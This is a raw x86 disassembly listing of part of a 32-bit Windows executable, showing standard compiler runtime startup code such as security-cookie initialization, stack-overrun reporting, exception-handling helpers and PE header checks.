  404f8d:	mov    DWORD PTR ds:0x4075c8,ebx
  404f93:	push   0x401024
  404f98:	push   0x401018
  404f9d:	call   0x405104
  404fa2:	pop    ecx
  404fa3:	pop    ecx
  404fa4:	test   eax,eax
  404fa6:	je     0x404fb3
  404fa8:	jmp    0x4050ed
  404fad:	mov    DWORD PTR ds:0x4071a4,ebx
  404fb3:	cmp    DWORD PTR ds:0x4075c8,ebx
  404fb9:	jne    0x404fd6
  404fbb:	push   0x401014
  404fc0:	push   0x401000
  404fc5:	call   0x405878
  404fca:	pop    ecx
  404fcb:	pop    ecx
  404fcc:	mov    DWORD PTR ds:0x4075c8,0x2
  404fd6:	test   esi,esi
  404fd8:	jne    0x404fe3
  404fda:	xor    eax,eax
  404fdc:	mov    ecx,0x4075c4
  404fe1:	xchg   DWORD PTR [ecx],eax
  404fe3:	cmp    DWORD PTR ds:0x4075d4,0x0
  404fea:	je     0x405011
  404fec:	push   0x4075d4
  404ff1:	call   0x4056b0
  404ff6:	pop    ecx
  404ff7:	test   eax,eax
  404ff9:	je     0x405011
  404ffb:	push   0x0
  404ffd:	push   0x2
  404fff:	push   0x0
  405001:	mov    esi,DWORD PTR ds:0x4075d4
  405007:	mov    ecx,esi
  405009:	call   DWORD PTR ds:0x4081d8
  40500f:	call   esi
  405011:	mov    eax,ds:0x40814c
  405016:	mov    ecx,DWORD PTR [eax]
  405018:	test   ecx,ecx
  40501a:	je     0x4050ed
  405020:	mov    DWORD PTR [ebp-0x20],ecx
  405023:	push   0x20
  405025:	pop    esi
  405026:	mov    edx,DWORD PTR [ebp-0x24]
  405029:	movzx  eax,WORD PTR [ecx]
  40502c:	cmp    ax,si
  40502f:	ja     0x405081
  405031:	test   ax,ax
  405034:	je     0x40503a
  405036:	test   edx,edx
  405038:	jne    0x405081
  40503a:	movzx  eax,WORD PTR [ecx]
  40503d:	test   ax,ax
  405040:	je     0x40504f
  405042:	cmp    ax,si
  405045:	ja     0x40504f
  405047:	add    ecx,0x2
  40504a:	mov    DWORD PTR [ebp-0x20],ecx
  40504d:	jmp    0x40503a
  40504f:	test   BYTE PTR [ebp-0x40],0x1
  405053:	je     0x40505b
  405055:	movzx  eax,WORD PTR [ebp-0x3c]
  405059:	jmp    0x40505e
  40505b:	push   0xa
  40505d:	pop    eax
  40505e:	push   eax
  40505f:	push   ecx
  405060:	push   0x0
  405062:	push   0x400000
  405067:	call   0x404201
  40506c:	mov    ds:0x4071a0,eax
  405071:	cmp    DWORD PTR ds:0x4071b8,0x0
  405078:	jne    0x4050c9
  40507a:	push   eax
  40507b:	call   DWORD PTR ds:0x408174
  405081:	cmp    eax,0x22
  405084:	jne    0x405092
  405086:	xor    eax,eax
  405088:	test   edx,edx
  40508a:	sete   al
  40508d:	mov    edx,eax
  40508f:	mov    DWORD PTR [ebp-0x24],edx
  405092:	add    ecx,0x2
  405095:	mov    DWORD PTR [ebp-0x20],ecx
  405098:	jmp    0x405029
  40509a:	mov    ecx,DWORD PTR [ebp-0x14]
  40509d:	mov    eax,DWORD PTR [ecx]
  40509f:	mov    eax,DWORD PTR [eax]
  4050a1:	mov    DWORD PTR [ebp-0x28],eax
  4050a4:	push   ecx
  4050a5:	push   eax
  4050a6:	call   0x405584
  4050ab:	pop    ecx
  4050ac:	pop    ecx
  4050ad:	ret    
  4050ae:	mov    esp,DWORD PTR [ebp-0x18]
  4050b1:	mov    eax,DWORD PTR [ebp-0x28]
  4050b4:	mov    ds:0x4071a0,eax
  4050b9:	cmp    DWORD PTR ds:0x4071b8,0x0
  4050c0:	jne    0x4050c9
  4050c2:	push   eax
  4050c3:	call   DWORD PTR ds:0x4081cc
  4050c9:	cmp    DWORD PTR ds:0x4071a4,0x0
  4050d0:	jne    0x4050dd
  4050d2:	call   DWORD PTR ds:0x40816c
  4050d8:	mov    eax,ds:0x4071a0
  4050dd:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4050e4:	jmp    0x4050f9
  4050e6:	xor    eax,eax
  4050e8:	inc    eax
  4050e9:	ret    
  4050ea:	mov    esp,DWORD PTR [ebp-0x18]
  4050ed:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4050f4:	mov    eax,0xff
  4050f9:	call   0x4058cc
  4050fe:	ret    
  4050ff:	int3   
  405100:	int3   
  405101:	int3   
  405102:	int3   
  405103:	int3   
  405104:	mov    edi,edi
  405106:	push   ebp
  405107:	mov    ebp,esp
  405109:	push   ecx
  40510a:	mov    eax,ds:0x40700c
  40510f:	xor    eax,ebp
  405111:	mov    DWORD PTR [ebp-0x4],eax
  405114:	push   esi
  405115:	mov    esi,DWORD PTR [ebp+0x8]
  405118:	xor    eax,eax
  40511a:	cmp    esi,DWORD PTR [ebp+0xc]
  40511d:	jae    0x40513d
  40511f:	push   edi
  405120:	test   eax,eax
  405122:	jne    0x40513c
  405124:	mov    edi,DWORD PTR [esi]
  405126:	test   edi,edi
  405128:	je     0x405134
  40512a:	mov    ecx,edi
  40512c:	call   DWORD PTR ds:0x4081d8
  405132:	call   edi
  405134:	add    esi,0x4
  405137:	cmp    esi,DWORD PTR [ebp+0xc]
  40513a:	jb     0x405120
  40513c:	pop    edi
  40513d:	mov    ecx,DWORD PTR [ebp-0x4]
  405140:	xor    ecx,ebp
  405142:	pop    esi
  405143:	call   0x405170
  405148:	mov    esp,ebp
  40514a:	pop    ebp
  40514b:	ret    
  40514c:	int3   
  40514d:	int3   
  40514e:	int3   
  40514f:	int3   
  405150:	int3   
  405151:	int3   
  405152:	int3   
  405153:	int3   
  405154:	int3   
  405155:	int3   
  405156:	int3   
  405157:	int3   
  405158:	int3   
  405159:	int3   
  40515a:	int3   
  40515b:	int3   
  40515c:	int3   
  40515d:	int3   
  40515e:	int3   
  40515f:	int3   
  405160:	call   0x4057b8
  405165:	jmp    0x404f18
  40516a:	int3   
  40516b:	int3   
  40516c:	int3   
  40516d:	int3   
  40516e:	int3   
  40516f:	int3   
  405170:	cmp    ecx,DWORD PTR ds:0x40700c
  405176:	jne    0x40517b
  405178:	ret    0x0
  40517b:	jmp    0x4052bb
  405180:	int3   
  405181:	int3   
  405182:	int3   
  405183:	int3   
  405184:	int3   
  405185:	push   0x18
  405187:	push   0x406190
  40518c:	call   0x405884
  405191:	and    DWORD PTR [ebp-0x28],0x0
  405195:	mov    eax,ds:0x4075d0
  40519a:	mov    DWORD PTR [ebp-0x20],eax
  40519d:	cmp    eax,0xffffffff
  4051a0:	jne    0x4051b8
  4051a2:	push   DWORD PTR [ebp+0x8]
  4051a5:	mov    esi,DWORD PTR ds:0x40815c
  4051ab:	mov    ecx,esi
  4051ad:	call   DWORD PTR ds:0x4081d8
  4051b3:	call   esi
  4051b5:	pop    ecx
  4051b6:	jmp    0x40520c
  4051b8:	push   0x8
  4051ba:	call   0x405916
  4051bf:	pop    ecx
  4051c0:	and    DWORD PTR [ebp-0x4],0x0
  4051c4:	mov    eax,ds:0x4075d0
  4051c9:	mov    DWORD PTR [ebp-0x20],eax
  4051cc:	mov    eax,ds:0x4075cc
  4051d1:	mov    DWORD PTR [ebp-0x24],eax
  4051d4:	lea    eax,[ebp-0x24]
  4051d7:	push   eax
  4051d8:	lea    eax,[ebp-0x20]
  4051db:	push   eax
  4051dc:	push   DWORD PTR [ebp+0x8]
  4051df:	call   0x40592e
  4051e4:	add    esp,0xc
  4051e7:	mov    esi,eax
  4051e9:	mov    DWORD PTR [ebp-0x28],esi
  4051ec:	mov    ecx,DWORD PTR [ebp-0x20]
  4051ef:	mov    DWORD PTR ds:0x4075d0,ecx
  4051f5:	mov    ecx,DWORD PTR [ebp-0x24]
  4051f8:	mov    DWORD PTR ds:0x4075cc,ecx
  4051fe:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405205:	call   0x405215
  40520a:	mov    eax,esi
  40520c:	call   0x4058cc
  405211:	ret    
  405212:	mov    esi,DWORD PTR [ebp-0x28]
  405215:	push   0x8
  405217:	call   0x405922
  40521c:	pop    ecx
  40521d:	ret    
  40521e:	int3   
  40521f:	int3   
  405220:	int3   
  405221:	int3   
  405222:	int3   
  405223:	mov    edi,edi
  405225:	push   ebp
  405226:	mov    ebp,esp
  405228:	push   DWORD PTR [ebp+0x8]
  40522b:	call   0x405185
  405230:	neg    eax
  405232:	pop    ecx
  405233:	sbb    eax,eax
  405235:	neg    eax
  405237:	dec    eax
  405238:	pop    ebp
  405239:	ret    
  40523a:	int3   
  40523b:	int3   
  40523c:	int3   
  40523d:	int3   
  40523e:	int3   
  40523f:	int3   
  405240:	mov    edi,edi
  405242:	push   ebp
  405243:	mov    ebp,esp
  405245:	mov    ecx,DWORD PTR [ebp+0xc]
  405248:	test   ecx,ecx
  40524a:	je     0x405276
  40524c:	push   0xffffffe0
  40524e:	xor    edx,edx
  405250:	pop    eax
  405251:	div    ecx
  405253:	cmp    eax,DWORD PTR [ebp+0x10]
  405256:	jae    0x405276
  405258:	call   0x40593a
  40525d:	mov    DWORD PTR [eax],0xc
  405263:	xor    eax,eax
  405265:	push   eax
  405266:	push   eax
  405267:	push   eax
  405268:	push   eax
  405269:	push   eax
  40526a:	call   0x405945
  40526f:	add    esp,0x14
  405272:	xor    eax,eax
  405274:	pop    ebp
  405275:	ret    
  405276:	imul   ecx,DWORD PTR [ebp+0x10]
  40527a:	push   ecx
  40527b:	push   DWORD PTR [ebp+0x8]
  40527e:	call   0x4059fc
  405283:	pop    ecx
  405284:	pop    ecx
  405285:	pop    ebp
  405286:	ret    
  405287:	int3   
  405288:	int3   
  405289:	int3   
  40528a:	int3   
  40528b:	int3   
  40528c:	mov    edi,edi
  40528e:	push   ebp
  40528f:	mov    ebp,esp
  405291:	push   0x0
  405293:	call   DWORD PTR ds:0x408044
  405299:	push   DWORD PTR [ebp+0x8]
  40529c:	call   DWORD PTR ds:0x408054
  4052a2:	push   0xc0000409
  4052a7:	call   DWORD PTR ds:0x408098
  4052ad:	push   eax
  4052ae:	call   DWORD PTR ds:0x40809c
  4052b4:	pop    ebp
  4052b5:	ret    
  4052b6:	int3   
  4052b7:	int3   
  4052b8:	int3   
  4052b9:	int3   
  4052ba:	int3   
  4052bb:	mov    edi,edi
  4052bd:	push   ebp
  4052be:	mov    ebp,esp
  4052c0:	sub    esp,0x324
  4052c6:	mov    ds:0x4072c0,eax
  4052cb:	mov    DWORD PTR ds:0x4072bc,ecx
  4052d1:	mov    DWORD PTR ds:0x4072b8,edx
  4052d7:	mov    DWORD PTR ds:0x4072b4,ebx
  4052dd:	mov    DWORD PTR ds:0x4072b0,esi
  4052e3:	mov    DWORD PTR ds:0x4072ac,edi
  4052e9:	data16 mov WORD PTR ds:0x4072d8,ss
  4052f0:	data16 mov WORD PTR ds:0x4072cc,cs
  4052f7:	data16 mov WORD PTR ds:0x4072a8,ds
  4052fe:	data16 mov WORD PTR ds:0x4072a4,es
  405305:	data16 mov WORD PTR ds:0x4072a0,fs
  40530c:	data16 mov WORD PTR ds:0x40729c,gs
  405313:	pushf  
  405314:	pop    DWORD PTR ds:0x4072d0
  40531a:	mov    eax,DWORD PTR [ebp+0x0]
  40531d:	mov    ds:0x4072c4,eax
  405322:	mov    eax,DWORD PTR [ebp+0x4]
  405325:	mov    ds:0x4072c8,eax
  40532a:	lea    eax,[ebp+0x8]
  40532d:	mov    ds:0x4072d4,eax
  405332:	mov    eax,DWORD PTR [ebp-0x324]
  405338:	mov    DWORD PTR ds:0x407210,0x10001
  405342:	mov    eax,ds:0x4072c8
  405347:	mov    ds:0x4071cc,eax
  40534c:	mov    DWORD PTR ds:0x4071c0,0xc0000409
  405356:	mov    DWORD PTR ds:0x4071c4,0x1
  405360:	mov    DWORD PTR ds:0x4071d0,0x3
  40536a:	push   0x4
  40536c:	pop    eax
  40536d:	imul   eax,eax,0x0
  405370:	mov    DWORD PTR [eax+0x4071d4],0x2
  40537a:	push   0x4
  40537c:	pop    eax
  40537d:	shl    eax,0x0
  405380:	mov    ecx,DWORD PTR ds:0x40700c
  405386:	mov    DWORD PTR [eax+0x4071d4],ecx
  40538c:	push   0x4
  40538e:	pop    eax
  40538f:	shl    eax,1
  405391:	mov    ecx,DWORD PTR ds:0x407010
  405397:	mov    DWORD PTR [eax+0x4071d4],ecx
  40539d:	push   0x4
  40539f:	pop    eax
  4053a0:	imul   eax,eax,0x0
  4053a3:	mov    ecx,DWORD PTR ds:0x40700c
  4053a9:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4053ad:	push   0x4
  4053af:	pop    eax
  4053b0:	shl    eax,0x0
  4053b3:	mov    ecx,DWORD PTR ds:0x407010
  4053b9:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4053bd:	push   0x4010ec
  4053c2:	call   0x40528c
  4053c7:	mov    esp,ebp
  4053c9:	pop    ebp
  4053ca:	ret    
  4053cb:	int3   
  4053cc:	int3   
  4053cd:	int3   
  4053ce:	int3   
  4053cf:	int3   
  4053d0:	mov    edi,edi
  4053d2:	push   ebp
  4053d3:	mov    ebp,esp
  4053d5:	mov    ds:0x4072c0,eax
  4053da:	mov    DWORD PTR ds:0x4072bc,ecx
  4053e0:	mov    DWORD PTR ds:0x4072b8,edx
  4053e6:	mov    DWORD PTR ds:0x4072b4,ebx
  4053ec:	mov    DWORD PTR ds:0x4072b0,esi
  4053f2:	mov    DWORD PTR ds:0x4072ac,edi
  4053f8:	data16 mov WORD PTR ds:0x4072d8,ss
  4053ff:	data16 mov WORD PTR ds:0x4072cc,cs
  405406:	data16 mov WORD PTR ds:0x4072a8,ds
  40540d:	data16 mov WORD PTR ds:0x4072a4,es
  405414:	data16 mov WORD PTR ds:0x4072a0,fs
  40541b:	data16 mov WORD PTR ds:0x40729c,gs
  405422:	pushf  
  405423:	pop    DWORD PTR ds:0x4072d0
  405429:	mov    DWORD PTR ds:0x407210,0x10001
  405433:	mov    eax,DWORD PTR [ebp+0x4]
  405436:	mov    ds:0x4072c8,eax
  40543b:	lea    eax,[ebp+0x4]
  40543e:	add    eax,0x4
  405441:	mov    ds:0x4072d4,eax
  405446:	mov    eax,ds:0x4072c8
  40544b:	mov    ds:0x4071cc,eax
  405450:	mov    DWORD PTR ds:0x4071c0,0xc0000409
  40545a:	mov    DWORD PTR ds:0x4071c4,0x1
  405464:	mov    DWORD PTR ds:0x4071d0,0x1
  40546e:	push   0x4
  405470:	pop    eax
  405471:	imul   eax,eax,0x0
  405474:	mov    DWORD PTR [eax+0x4071d4],0x8
  40547e:	push   0x4010ec
  405483:	call   0x40528c
  405488:	pop    ebp
  405489:	ret    
  40548a:	int3   
  40548b:	int3   
  40548c:	int3   
  40548d:	int3   
  40548e:	int3   
  40548f:	int3   
  405490:	mov    edi,edi
  405492:	push   ebp
  405493:	mov    ebp,esp
  405495:	push   esi
  405496:	mov    esi,ecx
  405498:	call   DWORD PTR ds:0x4081c4
  40549e:	test   BYTE PTR [ebp+0x8],0x1
  4054a2:	je     0x4054ab
  4054a4:	push   esi
  4054a5:	call   0x404d30
  4054aa:	pop    ecx
  4054ab:	mov    eax,esi
  4054ad:	pop    esi
  4054ae:	pop    ebp
  4054af:	ret    0x4
  4054b2:	int3   
  4054b3:	int3   
  4054b4:	int3   
  4054b5:	int3   
  4054b6:	int3   
  4054b7:	int3   
  4054b8:	jmp    DWORD PTR ds:0x4081a8
  4054be:	int3   
  4054bf:	int3   
  4054c0:	int3   
  4054c1:	int3   
  4054c2:	int3   
  4054c3:	int3   
  4054c4:	jmp    DWORD PTR ds:0x4081a0
  4054ca:	int3   
  4054cb:	int3   
  4054cc:	int3   
  4054cd:	int3   
  4054ce:	int3   
  4054cf:	int3   
  4054d0:	jmp    DWORD PTR ds:0x40819c
  4054d6:	int3   
  4054d7:	int3   
  4054d8:	int3   
  4054d9:	int3   
  4054da:	int3   
  4054db:	int3   
  4054dc:	jmp    DWORD PTR ds:0x408198
  4054e2:	int3   
  4054e3:	int3   
  4054e4:	int3   
  4054e5:	int3   
  4054e6:	int3   
  4054e7:	int3   
  4054e8:	int3   
  4054e9:	int3   
  4054ea:	int3   
  4054eb:	int3   
  4054ec:	int3   
  4054ed:	int3   
  4054ee:	int3   
  4054ef:	int3   
  4054f0:	jmp    DWORD PTR ds:0x408194
  4054f6:	int3   
  4054f7:	int3   
  4054f8:	int3   
  4054f9:	int3   
  4054fa:	int3   
  4054fb:	int3   
  4054fc:	jmp    DWORD PTR ds:0x408190
  405502:	int3   
  405503:	int3   
  405504:	int3   
  405505:	int3   
  405506:	int3   
  405507:	int3   
  405508:	jmp    DWORD PTR ds:0x40818c
  40550e:	int3   
  40550f:	int3   
  405510:	int3   
  405511:	int3   
  405512:	int3   
  405513:	int3   
  405514:	int3   
  405515:	int3   
  405516:	int3   
  405517:	int3   
  405518:	int3   
  405519:	int3   
  40551a:	int3   
  40551b:	int3   
  40551c:	int3   
  40551d:	int3   
  40551e:	int3   
  40551f:	int3   
  405520:	mov    edi,edi
  405522:	push   ebp
  405523:	mov    ebp,esp
  405525:	mov    eax,DWORD PTR [ebp+0x8]
  405528:	mov    eax,DWORD PTR [eax]
  40552a:	cmp    DWORD PTR [eax],0xe06d7363
  405530:	jne    0x40555d
  405532:	cmp    DWORD PTR [eax+0x10],0x3
  405536:	jne    0x40555d
  405538:	mov    eax,DWORD PTR [eax+0x14]
  40553b:	cmp    eax,0x19930520
  405540:	je     0x405557
  405542:	cmp    eax,0x19930521
  405547:	je     0x405557
  405549:	cmp    eax,0x19930522
  40554e:	je     0x405557
  405550:	cmp    eax,0x1994000
  405555:	jne    0x40555d
  405557:	call   DWORD PTR ds:0x40817c
  40555d:	xor    eax,eax
  40555f:	pop    ebp
  405560:	ret    0x4
  405563:	int3   
  405564:	int3   
  405565:	int3   
  405566:	int3   
  405567:	int3   
  405568:	int3   
  405569:	int3   
  40556a:	int3   
  40556b:	int3   
  40556c:	int3   
  40556d:	int3   
  40556e:	int3   
  40556f:	int3   
  405570:	push   0x405520
  405575:	call   DWORD PTR ds:0x408044
  40557b:	xor    eax,eax
  40557d:	ret    
  40557e:	int3   
  40557f:	int3   
  405580:	int3   
  405581:	int3   
  405582:	int3   
  405583:	int3   
  405584:	jmp    DWORD PTR ds:0x408188
  40558a:	int3   
  40558b:	int3   
  40558c:	int3   
  40558d:	int3   
  40558e:	int3   
  40558f:	push   0xc
  405591:	push   0x4061b0
  405596:	call   0x405a08
  40559b:	xor    ecx,ecx
  40559d:	mov    eax,DWORD PTR [ebp+0x8]
  4055a0:	test   eax,eax
  4055a2:	je     0x4055ef
  4055a4:	cmp    eax,0xffffffff
  4055a7:	je     0x4055ef
  4055a9:	mov    DWORD PTR [ebp-0x4],ecx
  4055ac:	mov    edx,0x5a4d
  4055b1:	cmp    WORD PTR [eax],dx
  4055b4:	jne    0x4055e8
  4055b6:	mov    edx,DWORD PTR [eax+0x3c]
  4055b9:	test   edx,edx
  4055bb:	js     0x4055e8
  4055bd:	cmp    edx,0x10000000
  4055c3:	jae    0x4055e8
  4055c5:	add    eax,edx
  4055c7:	mov    DWORD PTR [ebp-0x1c],eax
  4055ca:	mov    ecx,DWORD PTR [eax]
  4055cc:	sub    ecx,0x4550
  4055d2:	neg    ecx
  4055d4:	sbb    ecx,ecx
  4055d6:	not    ecx
  4055d8:	and    ecx,eax
  4055da:	jmp    0x4055e5
  4055dc:	xor    eax,eax
  4055de:	inc    eax
  4055df:	ret    
  4055e0:	mov    esp,DWORD PTR [ebp-0x18]
  4055e3:	xor    ecx,ecx
  4055e5:	mov    DWORD PTR [ebp-0x1c],ecx
  4055e8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4055ef:	mov    eax,ecx
  4055f1:	call   0x405a4d
  4055f6:	ret    0x4
  4055f9:	int3   
  4055fa:	int3   
  4055fb:	int3   
  4055fc:	int3   
  4055fd:	int3   
  4055fe:	mov    edi,edi
  405600:	push   ebp
  405601:	mov    ebp,esp
  405603:	push   0x0
  405605:	call   DWORD PTR ds:0x408080
  40560b:	test   eax,eax
  40560d:	je     0x40562f
  40560f:	push   eax
  405610:	call   0x40558f
  405615:	test   eax,eax
  405617:	je     0x40562f
  405619:	movzx  ecx,WORD PTR [eax+0x5c]
  40561d:	push   0x2
  40561f:	pop    eax
  405620:	cmp    cx,ax
  405623:	je     0x405632
  405625:	cmp    ecx,0x3
  405628:	jne    0x40562f
  40562a:	xor    eax,eax
  40562c:	inc    eax
  40562d:	pop    ebp
  40562e:	ret    
  40562f:	mov    eax,DWORD PTR [ebp+0x8]
  405632:	pop    ebp
  405633:	ret    
  405634:	int3   
  405635:	int3   
  405636:	int3   
  405637:	int3   
  405638:	int3   
  405639:	int3   
  40563a:	jmp    DWORD PTR ds:0x408180
  405640:	int3   
  405641:	int3   
  405642:	int3   
  405643:	int3   
  405644:	int3   
  405645:	int3   
  405646:	int3   
  405647:	int3   
  405648:	int3   
  405649:	int3   
  40564a:	int3   
  40564b:	int3   
  40564c:	int3   
  40564d:	int3   
  40564e:	int3   
  40564f:	int3   
  405650:	xor    eax,eax
  405652:	ret    
  405653:	int3   
  405654:	int3   
  405655:	int3   
  405656:	int3   
  405657:	int3   
  405658:	int3   
  405659:	int3   
  40565a:	int3   
  40565b:	int3   
  40565c:	int3   
  40565d:	int3   
  40565e:	int3   
  40565f:	int3   
  405660:	mov    edi,edi
  405662:	push   ebp
  405663:	mov    ebp,esp
  405665:	mov    eax,DWORD PTR [ebp+0x8]
  405668:	xor    edx,edx
  40566a:	push   ebx
  40566b:	push   esi
  40566c:	push   edi
  40566d:	mov    ecx,DWORD PTR [eax+0x3c]
  405670:	add    ecx,eax
  405672:	movzx  eax,WORD PTR [ecx+0x14]
  405676:	movzx  ebx,WORD PTR [ecx+0x6]
  40567a:	add    eax,0x18
  40567d:	add    eax,ecx
  40567f:	test   ebx,ebx
  405681:	je     0x40569e
  405683:	mov    edi,DWORD PTR [ebp+0xc]
  405686:	mov    esi,DWORD PTR [eax+0xc]
  405689:	cmp    edi,esi
  40568b:	jb     0x405696
  40568d:	mov    ecx,DWORD PTR [eax+0x8]
  405690:	add    ecx,esi
  405692:	cmp    edi,ecx
  405694:	jb     0x4056a0
  405696:	inc    edx
  405697:	add    eax,0x28
  40569a:	cmp    edx,ebx
  40569c:	jb     0x405686
  40569e:	xor    eax,eax
  4056a0:	pop    edi
  4056a1:	pop    esi
  4056a2:	pop    ebx
  4056a3:	pop    ebp
  4056a4:	ret    
  4056a5:	int3   
  4056a6:	int3   
  4056a7:	int3   
  4056a8:	int3   
  4056a9:	int3   
  4056aa:	int3   
  4056ab:	int3   
  4056ac:	int3   
  4056ad:	int3   
  4056ae:	int3   
  4056af:	int3   
  4056b0:	mov    edi,edi
  4056b2:	push   ebp
  4056b3:	mov    ebp,esp
  4056b5:	push   0xfffffffe
  4056b7:	push   0x4061d0
  4056bc:	push   0x4058e0
  4056c1:	mov    eax,fs:0x0
  4056c7:	push   eax
  4056c8:	sub    esp,0x8
  4056cb:	push   ebx
  4056cc:	push   esi
  4056cd:	push   edi
  4056ce:	mov    eax,ds:0x40700c
  4056d3:	xor    DWORD PTR [ebp-0x8],eax
  4056d6:	xor    eax,ebp
  4056d8:	push   eax
  4056d9:	lea    eax,[ebp-0x10]
  4056dc:	mov    fs:0x0,eax
  4056e2:	mov    DWORD PTR [ebp-0x18],esp
  4056e5:	mov    DWORD PTR [ebp-0x4],0x0
  4056ec:	push   0x400000
  4056f1:	call   0x405780
  4056f6:	add    esp,0x4
  4056f9:	test   eax,eax
  4056fb:	je     0x405751
  4056fd:	mov    eax,DWORD PTR [ebp+0x8]
  405700:	sub    eax,0x400000
  405705:	push   eax
  405706:	push   0x400000
  40570b:	call   0x405660
  405710:	add    esp,0x8
  405713:	test   eax,eax
  405715:	je     0x405751
  405717:	mov    eax,DWORD PTR [eax+0x24]
  40571a:	shr    eax,0x1f
  40571d:	not    eax
  40571f:	and    eax,0x1
  405722:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405729:	mov    ecx,DWORD PTR [ebp-0x10]
  40572c:	mov    DWORD PTR fs:0x0,ecx
  405733:	pop    ecx
  405734:	pop    edi
  405735:	pop    esi
  405736:	pop    ebx
  405737:	mov    esp,ebp
  405739:	pop    ebp
  40573a:	ret    
  40573b:	mov    eax,DWORD PTR [ebp-0x14]
  40573e:	mov    eax,DWORD PTR [eax]
  405740:	xor    ecx,ecx
  405742:	cmp    DWORD PTR [eax],0xc0000005
  405748:	sete   cl
  40574b:	mov    eax,ecx
  40574d:	ret    
  40574e:	mov    esp,DWORD PTR [ebp-0x18]
  405751:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405758:	xor    eax,eax
  40575a:	mov    ecx,DWORD PTR [ebp-0x10]
  40575d:	mov    DWORD PTR fs:0x0,ecx
  405764:	pop    ecx
  405765:	pop    edi
  405766:	pop    esi
  405767:	pop    ebx
  405768:	mov    esp,ebp
  40576a:	pop    ebp
  40576b:	ret    
  40576c:	int3   
  40576d:	int3   
  40576e:	int3   
  40576f:	int3   
  405770:	int3   
  405771:	int3   
  405772:	int3   
  405773:	int3   
  405774:	int3   
  405775:	int3   
  405776:	int3   
  405777:	int3   
  405778:	int3   
  405779:	int3   
  40577a:	int3   
  40577b:	int3   
  40577c:	int3   
  40577d:	int3   
  40577e:	int3   
  40577f:	int3   
  405780:	mov    edi,edi
  405782:	push   ebp
  405783:	mov    ebp,esp
  405785:	mov    eax,DWORD PTR [ebp+0x8]
  405788:	mov    ecx,0x5a4d
  40578d:	cmp    WORD PTR [eax],cx
  405790:	je     0x405796
  405792:	xor    eax,eax
  405794:	pop    ebp
  405795:	ret    
  405796:	mov    ecx,DWORD PTR [eax+0x3c]
  405799:	add    ecx,eax
  40579b:	xor    eax,eax
  40579d:	cmp    DWORD PTR [ecx],0x4550
  4057a3:	jne    0x4057b1
  4057a5:	mov    edx,0x10b
  4057aa:	cmp    WORD PTR [ecx+0x18],dx
  4057ae:	sete   al
  4057b1:	pop    ebp
  4057b2:	ret    
  4057b3:	int3   
  4057b4:	int3   
  4057b5:	int3   
  4057b6:	int3   
  4057b7:	int3   
  4057b8:	mov    edi,edi
  4057ba:	push   ebp
  4057bb:	mov    ebp,esp
  4057bd:	sub    esp,0x14
  4057c0:	and    DWORD PTR [ebp-0xc],0x0
  4057c4:	and    DWORD PTR [ebp-0x8],0x0
  4057c8:	mov    eax,ds:0x40700c
  4057cd:	push   esi
  4057ce:	push   edi
  4057cf:	mov    edi,0xbb40e64e
  4057d4:	mov    esi,0xffff0000
  4057d9:	cmp    eax,edi
  4057db:	je     0x4057ea
  4057dd:	test   esi,eax
  4057df:	je     0x4057ea
  4057e1:	not    eax
  4057e3:	mov    ds:0x407010,eax
  4057e8:	jmp    0x405854
  4057ea:	lea    eax,[ebp-0xc]
  4057ed:	push   eax
  4057ee:	call   DWORD PTR ds:0x408120
  4057f4:	mov    eax,DWORD PTR [ebp-0x8]
  4057f7:	xor    eax,DWORD PTR [ebp-0xc]
  4057fa:	mov    DWORD PTR [ebp-0x4],eax
  4057fd:	call   DWORD PTR ds:0x4080a4
  405803:	xor    DWORD PTR [ebp-0x4],eax
  405806:	call   DWORD PTR ds:0x4080a0
  40580c:	xor    DWORD PTR [ebp-0x4],eax
  40580f:	call   DWORD PTR ds:0x40811c
  405815:	xor    eax,DWORD PTR [ebp-0x4]
  405818:	lea    ecx,[ebp-0x4]
  40581b:	xor    eax,ecx
  40581d:	mov    DWORD PTR [ebp-0x4],eax
  405820:	lea    eax,[ebp-0x14]
  405823:	push   eax
  405824:	call   DWORD PTR ds:0x4080ac
  40582a:	mov    eax,DWORD PTR [ebp-0x10]
  40582d:	xor    eax,DWORD PTR [ebp-0x14]
  405830:	mov    ecx,DWORD PTR [ebp-0x4]
  405833:	xor    ecx,eax
  405835:	cmp    ecx,edi
  405837:	je     0x405841
  405839:	test   DWORD PTR ds:0x40700c,esi
  40583f:	jne    0x405846
  405841:	mov    ecx,0xbb40e64f
  405846:	mov    DWORD PTR ds:0x40700c,ecx
  40584c:	not    ecx
  40584e:	mov    DWORD PTR ds:0x407010,ecx
  405854:	pop    edi
  405855:	pop    esi
  405856:	mov    esp,ebp
  405858:	pop    ebp
  405859:	ret    
  40585a:	int3   
  40585b:	int3   
  40585c:	int3   
  40585d:	int3   
  40585e:	int3   
  40585f:	push   0x30000
  405864:	push   0x10000
  405869:	call   DWORD PTR ds:0x408158
  40586f:	pop    ecx
  405870:	pop    ecx
  405871:	ret    
  405872:	int3   
  405873:	int3   
  405874:	int3   
  405875:	int3   
  405876:	int3   
  405877:	int3   
  405878:	jmp    DWORD PTR ds:0x408168
  40587e:	int3   
  40587f:	int3   
  405880:	int3   
  405881:	int3   
  405882:	int3   
  405883:	int3   
  405884:	push   0x4058e0
  405889:	push   DWORD PTR fs:0x0
  405890:	mov    eax,DWORD PTR [esp+0x10]
  405894:	mov    DWORD PTR [esp+0x10],ebp
  405898:	lea    ebp,[esp+0x10]
  40589c:	sub    esp,eax
  40589e:	push   ebx
  40589f:	push   esi
  4058a0:	push   edi
  4058a1:	mov    eax,ds:0x40700c
  4058a6:	xor    DWORD PTR [ebp-0x4],eax
  4058a9:	xor    eax,ebp
  4058ab:	mov    DWORD PTR [ebp-0x1c],eax
  4058ae:	push   eax
  4058af:	mov    DWORD PTR [ebp-0x18],esp
  4058b2:	push   DWORD PTR [ebp-0x8]
  4058b5:	mov    eax,DWORD PTR [ebp-0x4]
  4058b8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4058bf:	mov    DWORD PTR [ebp-0x8],eax
  4058c2:	lea    eax,[ebp-0x10]
  4058c5:	mov    fs:0x0,eax
  4058cb:	ret    
  4058cc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4058cf:	xor    ecx,ebp
  4058d1:	call   0x405170
